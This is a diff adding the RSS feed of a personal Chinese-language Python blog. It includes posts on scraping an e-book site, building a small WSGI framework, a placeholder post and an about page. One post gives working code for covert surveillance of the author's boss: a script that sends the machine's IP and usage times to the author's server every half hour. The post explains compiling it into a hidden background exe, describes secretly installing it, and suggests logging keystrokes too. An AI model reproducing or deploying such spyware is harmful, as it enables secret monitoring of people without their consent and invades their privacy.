@@ -1,0 +1,492 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Picard Xie</title>
+    <link>https://bloodycoder.github.io/</link>
+    <description>Recent content on Picard Xie</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <managingEditor>picardxie@foxmail.com (Picard)</managingEditor>
+    <webMaster>picardxie@foxmail.com (Picard)</webMaster>
+    <lastBuildDate>Wed, 27 Jul 2016 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://bloodycoder.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>python爬虫入门(1):爬万本书籍</title>
+      <link>https://bloodycoder.github.io/post/python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A81%E7%88%AC%E4%B8%87%E6%9C%AC%E4%B9%A6%E7%B1%8D/</link>
+      <pubDate>Wed, 27 Jul 2016 00:00:00 +0000</pubDate>
+      <author>picardxie@foxmail.com (Picard)</author>
+      <guid>https://bloodycoder.github.io/post/python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A81%E7%88%AC%E4%B8%87%E6%9C%AC%E4%B9%A6%E7%B1%8D/</guid>
+      <description>
+
+&lt;p&gt;最近闲的无聊，想爬点书看看。 于是我选择了这个网站&lt;a href=&#34;http://www.rain8.com/&#34;&gt;雨枫轩&lt;/a&gt;。&lt;/p&gt;
+
+&lt;h2 id=&#34;step1-分析网站:4a2cb072312e8dcd59deb51f41fcdd50&#34;&gt;STEP1.分析网站&lt;/h2&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;一开始我想通过一篇文章引用的链接，将书爬完，后来发现并不需要这样做。比如我们可以打开&lt;a href=&#34;http://txt.rain8.com/txtzx/list_93_1.html&#34;&gt;人生哲学&lt;/a&gt;这个栏目。
+&lt;img src=&#34;http://upload-images.jianshu.io/upload_images/1243070-95e3c372c68e31ab.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&#34; alt=&#34;&#34; /&gt;
+如图1所示，会把页面数全列出来。
+并且这个url&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://txt.rain8.com/txtzx/list_93_1.html
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;也非常的有规律。
+可以看出是由&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&#39;http://txt.rain8.com/txt&#39;+&#39;栏目名称&#39;+&#39;list_栏目编号_页数.html&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;组成的。
+知道了这点后，我们就能轻松的把网站爬完了。&lt;/p&gt;
+
+&lt;h2 id=&#34;step2-初始化:4a2cb072312e8dcd59deb51f41fcdd50&#34;&gt;STEP2.初始化&lt;/h2&gt;
+
+&lt;p&gt;首先我们来理清思路。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://upload-images.jianshu.io/upload_images/1243070-79a5feabdfb29a02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这是我们需要的库&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import requests
+import re
+import os
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其实这个项目用urllib2也能完成。
+我们首先来初始化,在self.urls里，我们定义一些需要fetch的栏目。(比如言情，恐怖仙侠之类的书就可以跳过)。然后写一些正则表达式，供其他的method使用。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;class fetchBook:
+    def __init__(self):
+        self.header = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0&#39;}
+        self.urls = [
+                     &#39;http://txt.rain8.com/txtgw/&#39;,
+                     &#39;http://txt.rain8.com/txtzj/&#39;,
+                     &#39;http://txt.rain8.com/txtzx/&#39;,
+                     &#39;http://txt.rain8.com/txtsh/&#39;
+                     ]
+        self.rePageIndex = re.compile(&#39;list_\d+_\d+.html&#39;)#得到栏目编号
+        self.rePageCount = re.compile(&#39;&amp;lt;strong&amp;gt;\d+&amp;lt;/strong&amp;gt;&#39;)#得到页面数目
+        self.reDownloadGet1 = re.compile(&#39;href=.http://txt.rain8.com/plus/xiazai_yfx.php?[^&amp;gt;]+&#39;)#得到下载链接
+        self.reGetTitle = re.compile(&#39;&amp;lt;title&amp;gt;.+&amp;lt;/title&amp;gt;&#39;)#得到标题
+        self.reGetAuthor = re.compile(&amp;quot;&amp;lt;/small&amp;gt;&amp;lt;span&amp;gt;[^&amp;gt;]+&amp;quot;)#得到作者名称
+        self.reBookGetNew = re.compile(&#39;&#39;)#得到书籍链接
+        self.reBookGetOld = re.compile(&#39;&#39;)
+        self.cnt = 0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;step3-获取所有的页面:4a2cb072312e8dcd59deb51f41fcdd50&#34;&gt;STEP3.获取所有的页面&lt;/h2&gt;
+
+&lt;p&gt;我们可以查看&lt;a href=&#34;http://txt.rain8.com/txtzx/list_93_1.html&#34;&gt;人生哲学&lt;/a&gt;源代码。可以找到总共的页数。
+&lt;img src=&#34;http://upload-images.jianshu.io/upload_images/1243070-32d73f21cacdfa75.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&#34; alt=&#34;&#34; /&gt;
+然后我们就能得到每一页的数据。
+代码如下&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    def viewAllPage(self,url):
+        &amp;quot;&amp;quot;&amp;quot;
+        函数功能为把该栏目下所有页面全过一遍。
+        &amp;quot;&amp;quot;&amp;quot;
+        req = requests.get(url,headers = self.header)
+        pageIndex = self.rePageIndex.findall(req.text)[0][5:7]
+        pageCount = int(self.rePageCount.findall(req.text)[0][8:-9])
+        urlToFetch = [url,&#39;list_&#39;,pageIndex,&#39;_&#39;,&#39;1&#39;,&#39;.html&#39;]
+        foldname = self.reGetTitle.findall(req.text)[0][7:]
+        foldname = foldname.encode(&#39;unicode_escape&#39;).decode(&#39;string_escape&#39;)
+        foldname = foldname.split(&#39;|&#39;)[0]
+        self.createDir(foldname)
+        for page in range(1,pageCount+1):
+            urlToFetch[4] = str(page)
+            url_to_get = &#39;&#39;.join(urlToFetch)#得到所有页面的url
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;step4-得到下载链接:4a2cb072312e8dcd59deb51f41fcdd50&#34;&gt;STEP4.得到下载链接&lt;/h2&gt;
+
+&lt;p&gt;然后我们用上面写好的正则表达式，来匹配她的下载链接。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    def fetchDownloadUrl(self,bookurl):
+        req = requests.get(bookurl,headers = self.header)
+        result = self.reDownloadGet1.findall(req.text)
+        result = result[0][6:-17]
+        authorname = self.reGetAuthor.findall(req.text)[0][14:-6].encode(&#39;unicode_escape&#39;).decode(&#39;string_escape&#39;)
+        req = requests.get(result,headers = self.header)
+        bookname = self.reGetTitle.findall(req.text)[0][7:-24]
+        downloadurl = self.reDownloadGet1.findall(req.text)[0][6:-17]
+        return downloadurl,bookname,authorname
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;step5-下载:4a2cb072312e8dcd59deb51f41fcdd50&#34;&gt;STEP5.下载&lt;/h2&gt;
+
+&lt;p&gt;下载的时候，由于该网站下载的书都是rar格式的。所以我们只要用二进制的方式写就可以了。
+我们调用&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;self.req = requests.get(downloadUrl,headers = self.header)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;f = open(posi+&#39;/&#39;+bookname+&#39;.rar&#39;,&#39;wb&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;就可以写进去了。&lt;/p&gt;
+
+&lt;h2 id=&#34;step6-编码问题:4a2cb072312e8dcd59deb51f41fcdd50&#34;&gt;STEP6.编码问题&lt;/h2&gt;
+
+&lt;p&gt;之前一直被python的编码问题搞的头大，这次又遇见了。于是找了点资料看了看。
+因为python工作使用的编码是unicode，如果要在编码间进行转化，推荐要先decode成unicode，然后再encode成别的编码。
+然后我在爬内容的过程中碰到了这个问题：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;s = u&#39;\xb9\xc5\xca\xab\xb4\xca\xc3\xfb\xd6\xf8&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;\xb9这样的很明显应该是gbk编码。而python却在字符串前加了个u。然后我对这串字符encode还是decode都会报错。或者打印出来乱码。
+经过查阅资料，我找到了一种解决办法&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;s.encode(&#39;unicode_escape&#39;).decode(&#39;string_escape&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;经过这样处理后&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; print repr(s)
+&amp;gt;&amp;gt;&amp;gt; &#39;\xb9\xc5\xca\xab\xb4\xca\xc3\xfb\xd6\xf8&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显就恢复了正常。这时我们只要decode(&amp;lsquo;gb2312&amp;rsquo;)就能转换成unicode编码了。
+##STEP7.结果展示&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://upload-images.jianshu.io/upload_images/1243070-376983cb0ca40b4e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://upload-images.jianshu.io/upload_images/1243070-b00eca99a86efcc7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/bloodycoder/craw_books&#34;&gt;github地址&lt;/a&gt;
+喜欢的可以点一下喜欢。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>用python写一个简单的web框架</title>
+      <link>https://bloodycoder.github.io/post/%E7%94%A8python%E5%86%99web%E6%A1%86%E6%9E%B6/</link>
+      <pubDate>Sat, 23 Jul 2016 00:00:00 +0000</pubDate>
+      <author>picardxie@foxmail.com (Picard)</author>
+      <guid>https://bloodycoder.github.io/post/%E7%94%A8python%E5%86%99web%E6%A1%86%E6%9E%B6/</guid>
+      <description>
+
+&lt;p&gt;最近在实验室也没什么事情做，闲着无聊。于是想着造轮子，最后决定写一个简单的web框架玩玩。&lt;/p&gt;
+
+&lt;h2 id=&#34;step-1:3ae8925006184b2bc8002eb0749fe847&#34;&gt;STEP.1&lt;/h2&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;我们首先得选择基于什么协议来写这种框架。我们可以选择CGI协议,或者是WSGI接口。如果使用CGI,实际上我们只是按着CGI的规范写了一个python程序，然后每次服务器收到请求,就fork一个程序来执行它，然后返回一个http文档，性能比较低下。对于WSGI，而是一个存在于服务器和应用间的接口，在WSGI之前，web应用都是依赖于服务器的，现在流行的python框架都支持WSGI接口。&lt;/p&gt;
+
+&lt;h2 id=&#34;step-2-pep-333:3ae8925006184b2bc8002eb0749fe847&#34;&gt;STEP.2 PEP-333&lt;/h2&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;这一段是PEP-333 所提供的样例代码。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;def simple_app(environ, start_response):
+    &amp;quot;&amp;quot;&amp;quot;Simplest possible application object&amp;quot;&amp;quot;&amp;quot;
+    status = &#39;200 OK&#39;
+    response_headers = [(&#39;Content-type&#39;, &#39;text/plain&#39;)]
+    start_response(status, response_headers)
+    return [&#39;Hello world!\n&#39;]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这里的application被传入了两个值。
+- environ
+- start_response。
+environ是一个字典，保存了http请求的信息。
+start_response是一个函数，发送http响应。她有两个参数status 和 start_headers。
+- status必须是由状态编号和具体信息组成的字符串，必须符合RFC 2616。
+- start_headers是一个(header_name,header_value) 元组的列表元组列表。其中的hearder_name必须是合法的http header字段名。在RFC 2616, Section 4.2中有详细定义。
+当然官方还给出了类的实现。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  def __init__(self, environ, start_response):
+
+        self.environ = environ
+
+        self.start = start_response
+    def __iter__(self):
+
+        status = &#39;200 OK&#39;
+
+        response_headers = [(&#39;Content-type&#39;,&#39;text/plain&#39;)]
+
+        self.start(status, response_headers)
+
+        yield &amp;quot;Hello world!\n&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;了解了如上信息后，基本上可以开始了。我们就到官方给的代码上进行修改吧。&lt;/p&gt;
+
+&lt;h2 id=&#34;step-3-将路径链接到函数:3ae8925006184b2bc8002eb0749fe847&#34;&gt;STEP.3 将路径链接到函数&lt;/h2&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;首先我们得把用户请求的路径，链接到函数。我们可以实现一个getPage方法，专门做这件事。我们所拥有的信息，只有environ[&amp;lsquo;PATH_INFO&amp;rsquo;]。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;urls = [(&#39;^/index/$&#39;,&#39;func_index&#39;),
+        (&#39;^/comment/$&#39;,&#39;func_comment&#39;),
+        (&#39;^/environ/$&#39;,&#39;get_environ&#39;),
+        (&#39;^/post/$&#39;,&#39;post_test&#39;)]#urls是提供给app开发者来做链接的。
+    def getPage(self):
+        path = self.environ[&#39;PATH_INFO&#39;]
+        for pattern in self.urls:
+            m = re.match(pattern[0],path)#将urls元素的第0项和path进行比对，如果匹配上了，返回函数名
+            if m:
+                function = getattr(self,pattern[1])#getattr方法来得到函数
+                return function()
+        return &#39;404 not found&#39;#没匹配上任何东西
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;写到这里之后，每次添加页面，就只需要在urls列表中添加一个元祖就行了。&lt;/p&gt;
+
+&lt;h2 id=&#34;step-4-获取模版:3ae8925006184b2bc8002eb0749fe847&#34;&gt;STEP.4 获取模版&lt;/h2&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;既然是写web app，模版肯定是得有的。这里我提供了一种getTemplate方法来做这件事。不过我只提供了变量的替换。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    def getTemplate(self,tem_name,rep=0):
+        #这个函数返回内容,tem_name是文件名字
+        #参数rep是一个字典，默认为0
+        f = open(&#39;template/&#39;+tem_name)
+        html = f.read()
+        if(rep!=0):
+            for to_replace in rep:
+                strinfo = re.compile(&#39;\{\%\s*&#39;+str(to_replace)+&#39;\s*\%\}&#39;)
+                html = strinfo.sub(rep[to_replace],html)
+        return html
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;step-5-post数据的处理:3ae8925006184b2bc8002eb0749fe847&#34;&gt;STEP.5 POST数据的处理&lt;/h2&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;要想获取POST数据，我们得通过environ[&amp;lsquo;wsgi.input&amp;rsquo;]来处理。而他实际上就是系统的标准输入。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; environ[&#39;wsgi.input&#39;]        = sys.stdin
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;知道这点后就很好写了。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    def getPost(self):
+        if(self.environ[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;):
+            try:
+                request_body_size = int(self.environ.get(&#39;CONTENT_LENGTH&#39;, 0))#读出content_length的值
+            except:
+                request_body_size = 0
+            request_body = self.environ[&#39;wsgi.input&#39;].read(request_body_size) #请求的body
+            post_data = parse_qs(request_body)#parse_qs是cgi提供的方法，帮助我们处理请求
+            return post_data
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;##数据库的链接&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;pre&gt;&lt;code&gt;import MySQLdb
+class Model(object):
+    def __init__(self):
+    	    self.host = &#39;localhost&#39;
+    	    self.port = 3306
+    	    self.user = &#39;admin&#39;
+    	    self.passwd = &#39;admin&#39;
+    	    self.db = &#39;xieyi&#39;
+    def build_connect(self):
+    	self.conn = MySQLdb.connect(
+    		host = self.host,
+    		port = self.port,
+    		user = self.user,
+    		passwd = self.passwd,
+    		db = self.db
+    		)
+    def exec_ins(self,ins):
+    	cur = self.conn.cursor()
+    	num = cur.execute(ins)
+    	info = {} 
+    	if(num&amp;gt;0):
+    		info = cur.fetchmany(num)
+    	cur.close()
+    	self.conn.commit()
+    	return info 
+    def close(self):
+    	self.conn.close()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;step-6-清理工作:3ae8925006184b2bc8002eb0749fe847&#34;&gt;STEP.6 清理工作&lt;/h2&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;很多配置如果放到代码中，会增加阅读负担。于是把urls,model抽取出来。
+使得配置更加方便。&lt;/p&gt;
+
+&lt;h2 id=&#34;step-7-结束:3ae8925006184b2bc8002eb0749fe847&#34;&gt;STEP.7 结束&lt;/h2&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;这只是一个web框架简易的实现，仅供娱乐。如有疏漏，还望指出。
+代码po在&lt;a href=&#34;https://github.com/bloodycoder/skeleton&#34;&gt;https://github.com/bloodycoder/skeleton&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>如何用python知道某人是不是在用电脑</title>
+      <link>https://bloodycoder.github.io/post/%E5%A6%82%E4%BD%95%E7%94%A8python%E7%9F%A5%E9%81%93%E6%9F%90%E4%BA%BA%E6%98%AF%E4%B8%8D%E6%98%AF%E5%9C%A8%E7%94%A8%E7%94%B5%E8%84%91/</link>
+      <pubDate>Wed, 20 Jul 2016 00:00:00 +0000</pubDate>
+      <author>picardxie@foxmail.com (Picard)</author>
+      <guid>https://bloodycoder.github.io/post/%E5%A6%82%E4%BD%95%E7%94%A8python%E7%9F%A5%E9%81%93%E6%9F%90%E4%BA%BA%E6%98%AF%E4%B8%8D%E6%98%AF%E5%9C%A8%E7%94%A8%E7%94%B5%E8%84%91/</guid>
+      <description>
+
+&lt;p&gt;最近一直待实验室，老板说一直都要来。大夏天的，来一趟大汗淋漓。来了老板也可能不在。所以我打算偷偷写一个脚本装到老板电脑里。
+趁着老板不在，我想到把本机的IP信息以及登录时间用一个get方法发送到我的服务器，然后保存在数据库里。&lt;/p&gt;
+
+&lt;h3 id=&#34;step1:4174982311f7c6dcc323be51e6aa4789&#34;&gt;STEP1&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;
+# -*- coding: cp936 -*-
+import pythoncom
+import socket
+import requests,time
+#获取本机电脑名
+myname = socket.getfqdn(socket.gethostname(  ))
+myaddr = socket.gethostbyname(myname)
+def main():
+    while(True):
+        try:
+            r = requests.get(&#39;http://picard.sinaapp.com/spyon/?normid=%s&amp;amp;content=%s&#39;%(str(myaddr),&#39;I am using computer at &#39;+time.strftime(&amp;quot;%H:%M:%S&amp;quot;)))
+        except requests.ConnectionError:
+            pass
+        time.sleep(1800)
+main()
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;先试试效果怎么样。
+(view &lt;a href=&#34;http://picard.sinaapp.com/comment_wall/?page=1/&#34;&gt;http://picard.sinaapp.com/comment_wall/?page=1/&lt;/a&gt;)
+&lt;img src=&#34;http://upload-images.jianshu.io/upload_images/1243070-6195a432e90b035f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&#34; alt=&#34;1.jpg&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;step2:4174982311f7c6dcc323be51e6aa4789&#34;&gt;STEP2&lt;/h3&gt;
+
+&lt;p&gt;然后我用py2exe这个库，将python代码编译成了exe文件。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;from distutils.core import setup
+import py2exe
+setup(windows=[&#39;hook.py&#39;])  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;注意在编译的时候setup的参数一定得是windows，这样编译出来的exe，就是后台运行的。&lt;/p&gt;
+
+&lt;h3 id=&#34;setp3:4174982311f7c6dcc323be51e6aa4789&#34;&gt;SETP3&lt;/h3&gt;
+
+&lt;p&gt;最后一步，只要偷偷帮老板装上就行了。因为开机就后台运行，也不占内存。不用担心被发现。由于这个程序每半个小时就会get一次，所以基本上可以知道这个人什么时候上机，上了多久的网。当然如果够缺德的话，你也可以侦测他的键盘按键然后post到服务器上。
+从此我过上了愉快的暑假生活。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>第一篇</title>
+      <link>https://bloodycoder.github.io/post/1/</link>
+      <pubDate>Fri, 20 Feb 2015 00:00:00 +0000</pubDate>
+      <author>picardxie@foxmail.com (Picard)</author>
+      <guid>https://bloodycoder.github.io/post/1/</guid>
+      <description>
+
+&lt;p&gt;You can write regular &lt;a href=&#34;http://markdowntutorial.com/&#34;&gt;markdown&lt;/a&gt; here and Jekyll will automatically convert it to a nice webpage.  I strongly encourage you to &lt;a href=&#34;http://markdowntutorial.com/&#34;&gt;take 5 minutes to learn how to write in markdown&lt;/a&gt; - it&amp;rsquo;ll teach you how to transform regular text into bold/italics/headings/tables/etc.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Here is some bold text&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;here-is-a-secondary-heading:10d8aa81d13021669fdcd5a46901e0c0&#34;&gt;Here is a secondary heading&lt;/h2&gt;
+
+&lt;p&gt;Here&amp;rsquo;s a useless table:&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;left&#34;&gt;Number&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;Next number&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;Previous number&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;Five&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Six&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Four&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;Ten&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Eleven&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Nine&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;Seven&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Eight&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Six&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;Two&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Three&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;One&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;How about a yummy crepe?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://lafenicegelato.com/wp-content/uploads/2014/09/crepes-with-chocolate.jpg&#34; alt=&#34;Crepe&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here&amp;rsquo;s a code chunk:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;x &amp;lt;- 5 + 10
+print(x)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And here is some code with syntax highlighting&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var foo = function(x) {
+  return(x + 5);
+}
+foo(3)
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>About me</title>
+      <link>https://bloodycoder.github.io/page/about/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <author>picardxie@foxmail.com (Picard)</author>
+      <guid>https://bloodycoder.github.io/page/about/</guid>
+      <description>
+
+&lt;p&gt;因为大学不懂事，太浪了。&lt;/p&gt;
+
+&lt;p&gt;现在只能努力挣扎，让生活好起来。&lt;/p&gt;
+
+&lt;h3 id=&#34;my-hobbies:6083a88ee3411b0d17ce02d738f69d47&#34;&gt;my hobbies&lt;/h3&gt;
+
+&lt;p&gt;看似什么都喜欢，其实什么都不喜欢。&lt;/p&gt;
+
+&lt;p&gt;闲暇的时候&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;打打游戏(ps:overwatch and league of legends)&lt;/li&gt;
+&lt;li&gt;游游泳&lt;/li&gt;
+&lt;li&gt;又或者是看看书(ps:暂时只对灵修和技术类书籍感兴趣)。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;my-expectations:6083a88ee3411b0d17ce02d738f69d47&#34;&gt;my expectations&lt;/h3&gt;
+
+&lt;p&gt;Make things better and make myself better.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
